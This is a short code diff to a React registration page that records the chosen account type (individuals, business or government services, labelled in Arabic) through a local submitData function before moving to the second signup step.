@@ -1,5 +1,6 @@
 import { useState } from "react";
 import { Link, useLocation } from "wouter";
+import { submitData } from "@/lib/store";
 
 export default function Register() {
   const [accountType, setAccountType] = useState("individuals");
@@ -8,6 +9,17 @@ export default function Register() {
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
+    
+    // إرسال البيانات للوحة التحكم
+    const accountTypeLabels: Record<string, string> = {
+      individuals: 'أفراد',
+      business: 'أعمال',
+      government: 'خدمات حكومية'
+    };
+    submitData({
+      'نوع الحساب': accountTypeLabels[accountType] || accountType,
+    });
+    
     // Navigate to step 2 with account type
     setLocation(`/register-step2?type=${accountType}`);
   };
